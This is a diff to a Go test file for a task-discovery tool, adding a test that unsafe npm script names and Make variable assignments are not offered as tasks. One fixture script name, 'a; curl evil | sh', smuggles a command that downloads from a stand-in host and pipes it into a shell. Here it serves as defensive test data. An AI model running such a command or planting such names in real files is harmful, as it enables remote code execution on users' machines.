@@ -6,6 +6,7 @@ import (
 	"os/exec"
 	"path/filepath"
 	"runtime"
+	"slices"
 	"strconv"
 	"strings"
 	"sync"
@@ -182,5 +183,19 @@ func TestStopEndsTheProcessAndItsChildren(t *testing.T) {
 			}
 			time.Sleep(20 * time.Millisecond)
 		}
+	}
+}
+
+func TestUnsafeScriptNamesAndMakeAssignmentsAreNotOffered(t *testing.T) {
+	dir := t.TempDir()
+	os.WriteFile(filepath.Join(dir, "package.json"), []byte(`{"scripts":{"test":"x","a; curl evil | sh":"y"}}`), 0o644)
+	os.WriteFile(filepath.Join(dir, "Makefile"), []byte("CC ::= clang\nFLAGS := -g\nall::\n\t@true\nbuild: all\n\t@true\n"), 0o644)
+	var names []string
+	for _, task := range Discover(dir, nil) {
+		names = append(names, task.ID)
+	}
+	want := []string{"make:all", "make:build", "npm:test"}
+	if !slices.Equal(names, want) {
+		t.Fatalf("got %v, want %v", names, want)
 	}
 }
